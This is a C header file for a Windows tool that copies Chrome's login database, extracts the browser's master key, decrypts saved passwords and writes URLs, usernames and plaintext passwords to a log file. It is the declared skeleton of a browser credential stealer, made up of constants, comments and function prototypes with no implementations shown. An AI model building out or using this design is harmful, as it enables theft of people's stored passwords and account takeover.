#include <Windows.h>
#include "sqlite3.h"
#include <Wincrypt.h>
#include <bcrypt.h>

#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Bcrypt.lib")

#define DB_STRING L"Tmp.db" // This file will get created in %APPDATA%LOCAL CHROME PATH then deleted after using it
#define LOG_FILE L"Log.txt" // This file will get created in %APPDATA%LOCAL CHROME PATH
#define AES_BLOCK_SIZE 16
#define CIPHER_SIZE 12
#define CHROME_V10_HEADER_SIZE 3
#define NULL_TERMINATION_PADDING 1

#pragma warning(disable: 28521)
#define WMAX_PATH (MAX_PATH * sizeof(WCHAR))
#define ERROR_NO_RETURN_VALUE 0

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

SIZE_T StringLength(LPCWSTR String);

SIZE_T StringLengthA(LPCSTR String);

INT StringCompareStringRegionA(PCHAR String1, PCHAR String2, SIZE_T Count);

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2);

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2);

PCHAR StringCopyA(PCHAR String1, PCHAR String2);

PCHAR StringConcatA(PCHAR String, PCHAR String2);

BOOL PdIsPathValid(PWCHAR FilePath);

PCHAR StringLocateCharA(PCHAR String, INT Character);

PCHAR StringFindSubstringA(PCHAR String1, PCHAR String2);

PCHAR StringRemoveSubstring(PCHAR String, CONST PCHAR Substring);

PCHAR StringTerminateStringAtCharA(PCHAR String, INT Character);

BOOL CreateLocalAppDataObjectPath(PWCHAR pBuffer, PWCHAR Path, DWORD Size, BOOL bFlag);

VOID CharArrayToByteArray(PCHAR Char, PBYTE Byte, DWORD Length);

BOOL RtlGetMasterKey(PWCHAR Path);

VOID DisposeOfPathObject(PWCHAR Path);

BOOL WriteDecryptedDataToDisk(PCHAR Url, PCHAR Username, PBYTE Password);

INT CallbackSqlite3QueryObjectRoutine(PVOID DatabaseObject, INT Argc, PCHAR* Argv, PCHAR* ColumnName);

BOOL DeleteFileInternal(PWCHAR Path);

BOOL GetSqlite3ChromeDbData(VOID);